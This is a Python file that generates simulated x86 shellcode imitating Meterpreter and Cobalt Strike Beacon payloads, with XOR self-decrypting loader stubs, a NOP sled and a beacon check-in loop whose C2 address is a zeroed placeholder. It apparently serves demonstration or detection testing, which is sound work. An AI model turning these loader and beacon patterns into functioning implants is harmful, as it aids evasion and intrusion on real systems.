# shellcode_generator.py

class ShellcodeGenerator:
    def create_shellcode_payload(self, payload_type="demo"):
        """Create realistic shellcode payloads for demonstration"""
        
        if payload_type == "meterpreter":
            # Simulated Meterpreter-like payload structure
            # This is a DEMO - not actual Meterpreter code
            shellcode = bytes([
                # Stage 1: Loader stub
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                0x83, 0xC3, 0x10,                   # ADD EBX, 0x10
                
                # Stage 2: API resolution (simulated)
                0x60,                               # PUSHAD
                0x9C,                               # PUSHFD
                0xE8, 0x20, 0x00, 0x00, 0x00,       # CALL API resolution
                
                # Stage 3: Payload decryption (simulated)
                0xB9, 0x40, 0x01, 0x00, 0x00,       # MOV ECX, 0x140
                0x8A, 0x03,                         # MOV AL, [EBX]
                0x34, 0xAA,                         # XOR AL, 0xAA
                0x88, 0x03,                         # MOV [EBX], AL
                0x43,                               # INC EBX
                0xE2, 0xF7,                         # LOOP decryption loop
                
                # Stage 4: Execute decrypted payload
                0x61,                               # POPAD
                0x9D,                               # POPFD
                0xFF, 0xE3,                         # JMP EBX
            ])
            
            # Add padding to make it more realistic
            shellcode += b"\x90" * 50  # NOP sled
            shellcode += b"\xCC" * 10  # INT3 breakpoints (debug)
            
        elif payload_type == "beacon":
            # Simulated Cobalt Strike Beacon-like payload
            shellcode = bytes([
                # Beacon configuration block (simulated)
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_IP
                0x68, 0x1F, 0x90, 0x00, 0x00,       # PUSH PORT
                0x68, 0x05, 0x00, 0x00, 0x00,       # PUSH SLEEP_TIME
                
                # Beacon initialization
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL beacon_init
                0x5B,                               # POP EBX
                
                # Check-in with C2
                0x6A, 0x00,                         # PUSH 0
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_DATA
                0x6A, 0x04,                         # PUSH 4
                0xFF, 0x53, 0x08,                   # CALL [EBX+8] (send)
                
                # Main beacon loop
                0x6A, 0x05,                         # PUSH 5
                0xFF, 0x53, 0x0C,                   # CALL [EBX+12] (sleep)
                0xEB, 0xF0,                         # JMP checkin_loop
            ])
            
            shellcode += b"\x90" * 30
            
        else:  # demo payload
            # Simple demonstration payload with realistic structure
            shellcode = bytes([
                # Entry point
                0x55,                               # PUSH EBP
                0x89, 0xE5,                         # MOV EBP, ESP
                0x83, 0xEC, 0x10,                   # SUB ESP, 0x10
                
                # Get base address
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                
                # Decryption routine (simulated)
                0xB9, 0x80, 0x00, 0x00, 0x00,       # MOV ECX, 0x80
                0x8D, 0x73, 0x20,                   # LEA ESI, [EBX+0x20]
                0x31, 0xD2,                         # XOR EDX, EDX
                # dec_loop:
                0x8A, 0x06,                         # MOV AL, [ESI]
                0x34, 0x99,                         # XOR AL, 0x99
                0x88, 0x06,                         # MOV [ESI], AL
                0x46,                               # INC ESI
                0x42,                               # INC EDX
                0x39, 0xCA,                         # CMP EDX, ECX
                0x75, 0xF4,                         # JNE dec_loop
                
                # Execute decrypted code
                0x8D, 0x43, 0x20,                   # LEA EAX, [EBX+0x20]
                0xFF, 0xD0,                         # CALL EAX
                
                # Cleanup and return
                0x89, 0xEC,                         # MOV ESP, EBP
                0x5D,                               # POP EBP
                0xC3,                               # RET
            ])
            
            # Add encrypted data section (will be "decrypted" at runtime)
            encrypted_data = b"DEMO_PAYLOAD_ENCRYPTED_SECTION" * 4
            encrypted_data = bytes(b ^ 0x99 for b in encrypted_data)  # Simple XOR encryption
            shellcode += encrypted_data
        
        return shellcode